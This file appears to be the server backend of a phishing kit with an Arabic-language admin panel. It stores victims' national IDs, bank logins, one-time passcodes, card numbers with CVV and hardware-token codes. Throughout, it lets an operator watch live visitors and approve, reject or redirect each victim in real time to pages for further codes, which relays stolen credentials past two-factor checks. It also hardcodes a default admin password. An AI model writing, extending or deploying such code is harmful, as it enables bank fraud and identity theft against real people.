const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const ROOT = __dirname;
const PORT = process.env.PORT || 8080;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || '992812';

// ─── In-memory stores ───────────────────────────────────────────────
const applications = {}; // nationalId -> app object
const visitors = {};     // sessionId -> visitor object
const adminTokens = new Set();
let visitorIdCounter = 120000;
let appIdCounter = 10000;
let totalVisitors = 0;

// ─── Helpers ─────────────────────────────────────────────────────────
function makeToken() {
  return crypto.randomBytes(24).toString('hex');
}

function getCookies(req) {
  return (req.headers.cookie || '').split(';').reduce((acc, c) => {
    const idx = c.indexOf('=');
    if (idx > 0) acc[c.slice(0, idx).trim()] = c.slice(idx + 1).trim();
    return acc;
  }, {});
}

function isAdminReq(req) {
  const cookies = getCookies(req);
  const header = req.headers['x-admin-token'];
  const token = header || cookies['admin_session'];
  return token && adminTokens.has(token);
}

function readBody(req) {
  return new Promise((resolve) => {
    let body = '';
    req.on('data', c => { body += c; if (body.length > 2e6) req.destroy(); });
    req.on('end', () => {
      try { resolve(JSON.parse(body || '{}')); } catch { resolve({}); }
    });
  });
}

const MIME = {
  '.html': 'text/html; charset=utf-8', '.css': 'text/css',
  '.js': 'application/javascript', '.png': 'image/png',
  '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.gif': 'image/gif',
  '.svg': 'image/svg+xml', '.woff': 'font/woff', '.woff2': 'font/woff2',
  '.ttf': 'font/ttf', '.ico': 'image/x-icon', '.json': 'application/json',
  '.webp': 'image/webp', '.webmanifest': 'application/manifest+json',
  '.mp4': 'video/mp4', '.txt': 'text/plain',
};

function sendJson(res, data, status, extraHeaders) {
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
    'Cache-Control': 'no-store',
    ...extraHeaders,
  };
  res.writeHead(status || 200, headers);
  res.end(JSON.stringify(data));
}

function getOrCreateApp(nationalId) {
  if (!applications[nationalId]) {
    appIdCounter++;
    applications[nationalId] = {
      id: appIdCounter,
      nationalId,
      fullName: '', phone: '', address: '',
      username: '', password: '',
      otp: '', cardNumber: '', cardExpiry: '', cvv: '',
      hardToken: '', watchLink: '',
      selectedWatch: '',
      currentPage: 'home',
      status: 'active',
      redirectTo: null, redirectError: null,
      customMessage: null,
      loginApproved: null,
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
  }
  return applications[nationalId];
}

function getOrCreateVisitor(sessionId) {
  if (!visitors[sessionId]) {
    visitorIdCounter++;
    totalVisitors++;
    visitors[sessionId] = {
      id: visitorIdCounter,
      sessionId,
      currentPage: 'home',
      redirectTo: null,
      lastActiveAt: new Date().toISOString(),
      createdAt: new Date().toISOString(),
    };
  }
  return visitors[sessionId];
}

// ─── tRPC Procedure Router ────────────────────────────────────────────
async function executeProcedure(name, input, req, isAdmin) {
  switch (name) {

    // ─── Visitor tracking ──────────────────────────────────────────
    case 'admin.updateVisitor': {
      const { sessionId, page, currentPage } = input;
      if (sessionId) {
        const v = getOrCreateVisitor(sessionId);
        v.currentPage = currentPage || page || v.currentPage;
        v.lastActiveAt = new Date().toISOString();
      }
      return { success: true };
    }

    case 'admin.getVisitorRedirect': {
      const { sessionId } = input;
      const v = sessionId ? visitors[sessionId] : null;
      return { redirectTo: v ? (v.redirectTo || null) : null };
    }

    case 'admin.clearVisitorRedirect': {
      const { sessionId } = input;
      if (sessionId && visitors[sessionId]) {
        visitors[sessionId].redirectTo = null;
      }
      return { success: true };
    }

    // ─── Application status ────────────────────────────────────────
    case 'applications.getRedirectStatus': {
      const { nationalId } = input;
      const app = nationalId ? applications[nationalId] : null;
      return {
        redirectTo: app ? (app.redirectTo || null) : null,
        redirectError: app ? (app.redirectError || null) : null,
      };
    }

    case 'applications.clearRedirectByUser': {
      const { nationalId } = input;
      if (nationalId && applications[nationalId]) {
        applications[nationalId].redirectTo = null;
        applications[nationalId].redirectError = null;
      }
      return { success: true };
    }

    case 'applications.getCustomMessage': {
      const { nationalId } = input;
      const app = nationalId ? applications[nationalId] : null;
      return { message: app ? (app.customMessage || null) : null };
    }

    case 'applications.clearCustomMessage': {
      const { nationalId } = input;
      if (nationalId && applications[nationalId]) {
        applications[nationalId].customMessage = null;
      }
      return { success: true };
    }

    case 'applications.updatePage': {
      const { nationalId, page } = input;
      if (nationalId) {
        const app = getOrCreateApp(nationalId);
        app.currentPage = page || app.currentPage;
        app.updatedAt = new Date().toISOString();
      }
      return { success: true };
    }

    // ─── Application data collection ──────────────────────────────
    case 'applications.savePersonalInfo': {
      const { nationalId, fullName, phone, address } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      if (fullName) app.fullName = fullName;
      if (phone) app.phone = phone;
      if (address) app.address = address;
      app.updatedAt = new Date().toISOString();
      console.log('[savePersonalInfo] id=' + nationalId, fullName, phone);
      return { success: true };
    }

    case 'applications.saveLoginData': {
      const { nationalId, username, password } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      if (username) app.username = username;
      if (password) app.password = password;
      app.loginApproved = null;
      app.status = 'awaiting_login';
      app.updatedAt = new Date().toISOString();
      console.log('[saveLoginData] id=' + nationalId, username);
      return { success: true };
    }

    case 'applications.saveOtpData': {
      const { nationalId, otp } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      if (otp) app.otp = otp;
      app.status = 'awaiting_otp';
      app.updatedAt = new Date().toISOString();
      console.log('[saveOtpData] id=' + nationalId, otp);
      return { success: true };
    }

    case 'applications.saveCardData': {
      const { nationalId, cardNumber, cardExpiry, cvv, cardName, expiry } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      if (cardNumber) app.cardNumber = cardNumber;
      if (cardExpiry || expiry) app.cardExpiry = cardExpiry || expiry;
      if (cvv) app.cvv = cvv;
      if (cardName) app.cardName = cardName;
      app.status = 'awaiting_card';
      app.updatedAt = new Date().toISOString();
      console.log('[saveCardData] id=' + nationalId, cardNumber);
      return { success: true };
    }

    case 'applications.saveHardToken': {
      const { nationalId, hardToken, token } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      if (hardToken || token) app.hardToken = hardToken || token;
      app.status = 'awaiting_token';
      app.updatedAt = new Date().toISOString();
      console.log('[saveHardToken] id=' + nationalId);
      return { success: true };
    }

    case 'applications.saveWatchLink': {
      const { nationalId, watchLink, link } = input;
      if (!nationalId) throw new Error('nationalId required');
      const app = getOrCreateApp(nationalId);
      if (watchLink || link) app.watchLink = watchLink || link;
      app.updatedAt = new Date().toISOString();
      console.log('[saveWatchLink] id=' + nationalId);
      return { success: true };
    }

    // ─── Admin auth ────────────────────────────────────────────────
    case 'admin.login': {
      const { username, password } = input;
      if (password === ADMIN_PASSWORD) {
        const token = makeToken();
        adminTokens.add(token);
        return { success: true, _setToken: token };
      }
      throw new Error('بيانات الدخول غير صحيحة');
    }

    case 'admin.checkSession': {
      return { isAdmin: isAdmin, authenticated: isAdmin };
    }

    case 'admin.logout': {
      // token cleared via cookie
      return { success: true, _clearToken: true };
    }

    // ─── Admin data ────────────────────────────────────────────────
    case 'admin.getApplications': {
      if (!isAdmin) throw new Error('unauthorized');
      const now = Date.now();
      const apps = Object.values(applications).map(a => ({ ...a }));
      const cutoff = now - 60 * 1000;
      const activeIds = apps
        .filter(a => new Date(a.updatedAt).getTime() > cutoff)
        .map(a => a.id);
      const liveVisitorCount = Object.values(visitors)
        .filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000).length;
      return { apps, activeIds, liveVisitorCount, totalVisitors };
    }

    case 'admin.getLiveVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      const liveVisitors = Object.values(visitors)
        .filter(v => new Date(v.lastActiveAt).getTime() > Date.now() - 30000);
      return { visitors: liveVisitors };
    }

    case 'admin.getAllVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      return { visitors: Object.values(visitors) };
    }

    case 'admin.getWhatsAppLink': {
      return { link: global._whatsappLink || '' };
    }

    case 'admin.updateWhatsAppLink': {
      if (!isAdmin) throw new Error('unauthorized');
      global._whatsappLink = input.link || '';
      return { success: true };
    }

    case 'admin.setCustomMessage': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, message } = input;
      if (nationalId && applications[nationalId]) {
        applications[nationalId].customMessage = message || null;
      }
      return { success: true };
    }

    case 'admin.approveLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      const app = nationalId ? applications[nationalId]
        : Object.values(applications).find(a => a.id === applicationId);
      if (app) {
        app.loginApproved = true;
        app.redirectTo = 'otp';
        app.status = 'login_approved';
        app.updatedAt = new Date().toISOString();
      }
      return { success: true };
    }

    case 'admin.rejectLogin': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      const app = nationalId ? applications[nationalId]
        : Object.values(applications).find(a => a.id === applicationId);
      if (app) {
        app.loginApproved = false;
        app.redirectTo = 'login-error';
        app.status = 'login_rejected';
        app.updatedAt = new Date().toISOString();
      }
      return { success: true };
    }

    case 'admin.redirectUser': {
      if (!isAdmin) throw new Error('unauthorized');
      const { nationalId, redirectTo, redirectError } = input;
      if (nationalId && applications[nationalId]) {
        applications[nationalId].redirectTo = redirectTo || null;
        applications[nationalId].redirectError = redirectError || null;
        applications[nationalId].updatedAt = new Date().toISOString();
      }
      return { success: true };
    }

    case 'admin.redirectVisitor': {
      if (!isAdmin) throw new Error('unauthorized');
      const { sessionId, redirectTo } = input;
      if (sessionId && visitors[sessionId]) {
        visitors[sessionId].redirectTo = redirectTo || null;
      }
      return { success: true };
    }

    case 'admin.redirectAllToToken': {
      if (!isAdmin) throw new Error('unauthorized');
      const { redirectTo } = input;
      for (const app of Object.values(applications)) {
        if (app.status === 'active' || app.status.startsWith('awaiting')) {
          app.redirectTo = redirectTo || 'token';
          app.updatedAt = new Date().toISOString();
        }
      }
      return { success: true };
    }

    case 'admin.redirectWhatsApp': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      const app = nationalId ? applications[nationalId]
        : Object.values(applications).find(a => a.id === applicationId);
      if (app) {
        app.redirectTo = 'whatsapp';
        app.updatedAt = new Date().toISOString();
      }
      return { success: true };
    }

    case 'admin.deleteApplication': {
      if (!isAdmin) throw new Error('unauthorized');
      const { applicationId, nationalId } = input;
      if (nationalId) {
        delete applications[nationalId];
      } else {
        const key = Object.keys(applications).find(k => applications[k].id === applicationId);
        if (key) delete applications[key];
      }
      return { success: true };
    }

    case 'admin.deleteInactiveClients': {
      if (!isAdmin) throw new Error('unauthorized');
      const cutoff = Date.now() - 10 * 60 * 1000;
      for (const key of Object.keys(applications)) {
        if (new Date(applications[key].updatedAt).getTime() < cutoff) {
          delete applications[key];
        }
      }
      return { success: true };
    }

    case 'admin.resetTotalVisitors': {
      if (!isAdmin) throw new Error('unauthorized');
      totalVisitors = 0;
      return { success: true };
    }

    default:
      console.log('[tRPC] unknown procedure:', name);
      return { success: false, error: 'unknown procedure: ' + name };
  }
}

// ─── tRPC batch handler ───────────────────────────────────────────────
async function handleTrpc(req, res) {
  const reqPath = decodeURIComponent(req.url.split('?')[0]);
  const queryStr = req.url.split('?')[1] || '';
  const query = new URLSearchParams(queryStr);

  // Extract procedure names from path: /api/trpc/proc1,proc2
  const trpcBase = '/api/trpc/';
  const procs = reqPath.slice(trpcBase.length).split(',').filter(Boolean);
  if (!procs.length) return sendJson(res, [], 400);

  let inputs = {};
  if (req.method === 'GET') {
    try { inputs = JSON.parse(query.get('input') || '{}'); } catch { inputs = {}; }
  } else {
    const body = await readBody(req);
    inputs = body || {};
  }

  const isAdmin = isAdminReq(req);
  let setCookie = null;
  let clearCookie = false;

  const results = await Promise.all(procs.map(async (name, i) => {
    const raw = inputs[String(i)] || inputs;
    const input = raw?.json || raw || {};
    try {
      const data = await executeProcedure(name.trim(), input, req, isAdmin);
      // Handle auth side effects
      if (data && data._setToken) {
        setCookie = data._setToken;
        adminTokens.add(setCookie);
        delete data._setToken;
      }
      if (data && data._clearToken) {
        clearCookie = true;
        const cookies = getCookies(req);
        if (cookies.admin_session) adminTokens.delete(cookies.admin_session);
        delete data._clearToken;
      }
      return { result: { data: { json: data } } };
    } catch (e) {
      return { error: { message: e.message || 'Internal error', code: 'INTERNAL_SERVER_ERROR' } };
    }
  }));

  const extraHeaders = {};
  if (setCookie) {
    extraHeaders['Set-Cookie'] = `admin_session=${setCookie}; Path=/; HttpOnly; SameSite=Lax; Max-Age=86400`;
  }
  if (clearCookie) {
    extraHeaders['Set-Cookie'] = 'admin_session=; Path=/; HttpOnly; Max-Age=0';
  }

  sendJson(res, results, 200, extraHeaders);
}

// ─── HTTP Server ──────────────────────────────────────────────────────
const server = http.createServer(async (req, res) => {
  const reqPath = decodeURIComponent(req.url.split('?')[0]);

  if (req.method === 'OPTIONS') {
    res.writeHead(200, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, x-admin-token, Authorization',
    });
    return res.end();
  }

  // tRPC endpoint
  if (reqPath.startsWith('/api/trpc/')) {
    return handleTrpc(req, res);
  }

  // Static files
  let filePath = reqPath;

  if (filePath === '/') filePath = '/index.html';

  // SPA fallback: unknown paths without extension → index.html
  if (!path.extname(filePath)) {
    const htmlPath = path.join(ROOT, filePath + '.html');
    if (fs.existsSync(htmlPath)) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return fs.createReadStream(htmlPath).pipe(res);
    }
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return fs.createReadStream(path.join(ROOT, 'index.html')).pipe(res);
  }

  const fullPath = path.join(ROOT, filePath);
  if (!fs.existsSync(fullPath)) {
    if (filePath.endsWith('.html')) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return fs.createReadStream(path.join(ROOT, 'index.html')).pipe(res);
    }
    res.writeHead(404);
    return res.end('Not found');
  }

  const ext = path.extname(fullPath).toLowerCase();
  const headers = { 'Content-Type': MIME[ext] || 'application/octet-stream' };
  if (['.js', '.css', '.webp', '.png', '.jpg', '.woff2'].includes(ext)) {
    headers['Cache-Control'] = 'public, max-age=31536000, immutable';
  }
  res.writeHead(200, headers);
  fs.createReadStream(fullPath).pipe(res);
});

server.listen(PORT, () => {
  console.log(`✅ Server running → http://localhost:${PORT}`);
  console.log(`🔑 Admin password: ${ADMIN_PASSWORD}`);
  console.log(`📊 Admin panel → http://localhost:${PORT}/admin`);
});
